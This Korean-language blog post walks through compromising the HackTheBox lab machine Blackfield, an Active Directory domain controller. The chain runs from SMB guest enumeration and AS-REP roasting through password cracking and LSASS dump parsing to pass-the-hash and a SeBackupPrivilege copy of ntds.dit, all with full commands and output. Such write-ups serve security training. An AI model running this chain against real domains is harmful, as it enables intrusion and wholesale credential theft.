---
title: "HTB - Blackfield [Hard]"
date: 2026-01-12 00:00:00 +0900
categories: [HTB, Machine, AD]
tags: [htb, writeup, walkthrough, AD, hard, OSCP, ntds, AS-REP Roasting, lsass]
description: HackTheBox - Blackfield [Hard] Walkthrough
---

## Machine Info

| 항목 | 내용 |
|------|------|
| OS | Windows (AD) |
| 난이도 | Hard |

## TL;DR

| 항목 | 내용 |
|------|------|
| 1. | SMB Guest를 통한 profiles$ 쉐어 접근 |
| 2. | 유저명 확보 |
| 3. | AS-REP Roasting 대상 해시 추출 및 크랙 |
| 4. | BloodHound를 통한 ForceChangePassword 파악 |
| 5. | 비밀번호 변경 및 SMB memory_analysis 쉐어 접근 |
| 6. | lsass.zip 파일 덤프 및 해시 추출 |
| 7. | SeBackuupPrivilege 권한 악용 |
| 8. | ntds.dit 덤프 및 DC 장악 |

## Information Gathering
### Port Scanning - nmap

```bash
└─$ nmap -sC -sV -T4 10.129.229.17 -oN nmap

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-12 15:58:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-01-12T15:59:33
|_  start_date: N/A
|_clock-skew: -1h59m59s
```

포트 스캐닝 결과는 다음과 같다.

| IP | Ports |
|----|-------|
| 10.129.229.17 | TCP: 53, 88, 135, 389, 445, 593, 3268, 5985 |

### smb

```bash
└─$ nxc smb 10.129.229.17 -u '' -p '' --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\:
SMB         10.129.229.17   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED

└─$ nxc smb 10.129.229.17 -u 'chunsik' -p '' --shares --smb-timeout 10
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\chunsik: (Guest)
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON                        Logon server share
SMB         10.129.229.17   445    DC01             profiles$       READ
SMB         10.129.229.17   445    DC01             SYSVOL                          Logon server share
```

대상 호스트는 익명 로그인 접근은 가능하지만 쉐어 열람은 차단하며 대신 게스트 로그인에 대해선 쉐어 열람이 허락된다.

```bash
└─$ smbclient //10.129.229.17/profiles$ -U 'chunsik' --password ''
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 16:47:12 2020
  ..                                  D        0  Wed Jun  3 16:47:12 2020
  AAlleni                             D        0  Wed Jun  3 16:47:11 2020
  ABarteski                           D        0  Wed Jun  3 16:47:11 2020
  ABekesz                             D        0  Wed Jun  3 16:47:11 2020
  ABenzies                            D        0  Wed Jun  3 16:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 16:47:11 2020
  AChampken                           D        0  Wed Jun  3 16:47:11 2020
  ACheretei                           D        0  Wed Jun  3 16:47:11 2020
  BZandonella                         D        0  Wed Jun  3 16:47:11 2020
  [ . . . ]
```

`profiles$`쉐어에 접근하면 이름으로 보이는 디렉토리가 나열되어 있다.

```bash
└─$ cut -d ' ' -f 3 dirty.txt > users.txt

└─$ cat users.txt
AAlleni
ABarteski
ABekesz
ABenzies
ABiemiller
AChampken
ACheretei
ACsonaki
AHigchens
AJaquemai
AKlado
```

모두 복사한 후, 이름만 남기도록 저장한다.

```bash
└─$ impacket-GetNPUsers 'BLACKFIELD.local/' -dc-ip 10.129.229.17 -no-pass -usersfile users.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$support@BLACKFIELD.LOCAL:88deff28b96c9962c809da1167005064$8ebeef414ffb63b84e23f6692326eafaebd641077534f463b706a8227bdcd205a08a792cedd5c0f17a408d7cd3656d1acd2097abf83084b4916bd6545ded8294fcf67b3c8
3ef9e44bae5ecb87b0ea4eb66a1de01065349e92b78f83110de7ce9243023af1506d7dd728f71c37aee50b127678bf0cd94ba0142c3979bf4e4286a327d17b76078877a78a693c7afd9bc564ba47355c39c559ef45e2f0409e7f070be5f8923edd02fb506e1216ad0
030c3138e7911b3f1332fbd357953f198011a372a97a6a9df8cf766980dc1b3247d1b5940c7a693020205a5706ebf55b118a19b02efd8b5fa8b6860e180c83c89f6b0d69959299
```

저장한 이름들을 이용해 `AS-REP Roasting`을 진행하면, `support`유저가 취약한 것을 확인할 수 있고 해당 유저의 해시값이 출력된다.

```bash
└─$ john support.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
1g 0:00:00:17 DONE (2026-01-12 18:33) 0.05841g/s 837323p/s 837323c/s 837323C/s #13Carlyn..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

해시값을 저장한 후, `john`을 이용해 크랙을 시도하면 다음과 같은 크리덴셜을 확보할 수 있다.:

```plain
support:#00^BlackKnight
```

### bloodhound

```bash
└─$ bloodhound-python -u support -p '#00^BlackKnight' -d BLACKFIELD.local --zip -c All -ns 10.129.229.17
```

획득한 크리덴셜을 사용하여 `bloodhound`를 통해 `support`유저는 `Audit2020`유저에 대해 비밀번호 변경 권한을 가지고있다.

![bloodhound](assets/img/posts/Blackfield/bloodhound.png)

## Initial Access

```bash
└─$ net rpc password "Audit2020" 'Chunsik!@#' -U "BLACKFIELD/support"%"#00^BlackKnight" -S 10.129.229.17
```

`net rpc`를 사용하여 `support`유저의 권한으로 `Audit2020`의 비밀번호를 변경한다.

```bash
└─$ nxc smb 10.129.229.17 -u 'Audit2020' -p 'Chunsik!@#' --smb-timeout 10
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\Audit2020:Chunsik!@#

└─$ nxc smb 10.129.229.17 -u 'Audit2020' -p 'Chunsik!@#' --smb-timeout 10 --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\Audit2020:Chunsik!@#
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.229.17   445    DC01             profiles$       READ
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share
```

해당 유저는 `forensic`쉐어에 접근이 가능하다.

```bash
smb: \> cd memory_analysis\
smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 20:28:33 2020
  ..                                  D        0  Thu May 28 20:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 20:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 20:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 20:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 20:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 20:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 20:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 20:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 20:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 20:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 20:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 20:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 20:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 20:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 20:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 20:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 20:27:53 2020

                5102079 blocks of size 4096. 1690048 blocks available
```

`forensic`쉐어 내부 `memory_analysis`디렉토리에는 `lsass`관련 파일인 `lsass.zip`파일이 존재한다.

`lsass.exe`는 Windows에서 사용자 로그인 검증, 비밀번호 변경, 보안 정책 시행 등을 담당하는 핵심 시스템 프로세스로 사용자가 로그인 시, 계정 이름과 비밀번호 해시(`NT HASH`)가 해당 프로세스의 메모리에 저장된다.


```bash
└─$ smbclient //10.129.229.17/forensic -U 'audit2020' --password 'Chunsik!@#' -c "get memory_analysis\lsass.zip" --timeout 600

getting file \memory_analysis\lsass.zip of size 41936098 as memory_analysis\lsass.zip (171.9 KiloBytes/sec) (average 171.9 KiloBytes/sec)

└─$ unzip memory_analysis\\lsass.zip
Archive:  memory_analysis\lsass.zip
  inflating: lsass.DMP
```

대상 파일을 로컬로 가져오는데 파일 용량 때문인지 계속 중간에 끊겨 `timeout`옵션을 주어 이를 해결했다.

```bash
└─$ pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)

[ . . . ]
```

압축을 해제하여 얻은 `lsass.DMP` 파일을 `pypykatz`를 이용해 메모리 덤프 파일에서 사용자의 로그인 비밀번호, 해시 등을 추출한다. 획득한 크리덴셜은 다음과 같다.:

```plain
svc_backup:9658d1d1dcd9250115e2205d9f48400d
```

```bash
└─$ nxc smb 10.129.229.17 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
```

`netexec`을 통해 smb 접근을 확인해 유효한 계정임을 확인했다.

```bash
└─$ nxc winrm 10.129.229.17 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
WINRM       10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.229.17   5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
WINRM       10.129.229.17   5985   DC01             [-] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d zip() argument 2 is longer than argument 1
```

해당 계정은 `winrm`에 접근이 가능하기 때문에 `evil-winrm`을 사용하여 접근할 수 있다.

```bash
└─$ evil-winrm -i BLACKFIELD.local -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ~/Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> ls


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt


*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cat user.txt
[REDACTED]
```

대상 호스트에 접속한 후, 유저 플래그를 획득할 수 있다.

## Privilege Escalation

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

`svc_backup`유저는 `SeBackupPrivilege`권한을 가진다.

해당 권한은 Windows 시스템 내의 모든 파일과 레지스트리 키에 대한 접근 제어(ACL) 권한을 무시하고 읽을 수 있도록 허용한다. 이는 곧 `lsass`나 `SAM`덤프로 이어질 수 있다.

`SAM`덤프 `DiskShadow`모두 안되길래 탐색을 통해 다음과 같은 `Github`글을 찾았다.

[giuliano108 - SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)

해당 글은 동일하게 `SeBackupPrivilege`권한을 악용하는데 일반 복사가 아닌, 여러 도구를 활용하여 실제 파일을 추출한다. 해당 과정에서 AD의 핵심 데이터베이스 파일인 `ntds.dit`도 추출한다.

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeCmdLets.dll                          
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeUtils.dll                                                                      
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit                                                       
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd C:\Temp                                                            
*Evil-WinRM* PS C:\Temp> ls                                                                                                            
                                                                                                                     
    Directory: C:\Temp                                                                                               
                                                                                                                     
                                                                                                                     
Mode                LastWriteTime         Length Name   
----                -------------         ------ ----                                                                
-a----        1/12/2026  12:37 PM       18874368 ntds.dit   
-a----        1/12/2026  11:22 AM          45056 sam.hive                                                            
-a----        1/12/2026  11:22 AM       17596416 system.hive

*Evil-WinRM* PS C:\Temp> download ntds.dit                                                                           
                                                                                                                     
Info: Downloading C:\Temp\ntds.dit to ntds.dit                                                                       
                                                                                                                     
Info: Download successful!
```

위 도구들을 모두 활용하여 `ntds.dit`, `sam`, `system`을 추출한다.

```bash
└─$ impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL                                          
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                                                 
                                                                                                                     
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393                                              
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                                                              
[*] Searching for pekList, be patient                                                                                
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c                                          
[*] Reading and decrypting hashes from ntds.dit                                                                                                                                                                                            
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::                     
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                       
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f48fd278cbd9beb6e5769a4047434c2d:::                                                                                                                                                            
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::                            
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:b142c85d0bf06cffe26192e8cbd7de5c:::                                  
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::                                                                                                                                                          
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::

[ . . . ]
```

다시 로컬로 돌아와 추출한 모든 파일을 이용하여 다시 해시를 추출하면 관리자 크리덴셜을 획득할 수 있다.:

```plain
Administrator:184fb5e5178480be64824d4cd53b99ee
```

```bash
└─$ evil-winrm -i Blackfield.local -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ~/Desktop/root.txt
4375a629c7c67c8e29db269060c955cb
```

관리자 크리덴셜을 활용하여 대상 호스트에 접근한 후, 루트 플래그를 획득할 수 있다.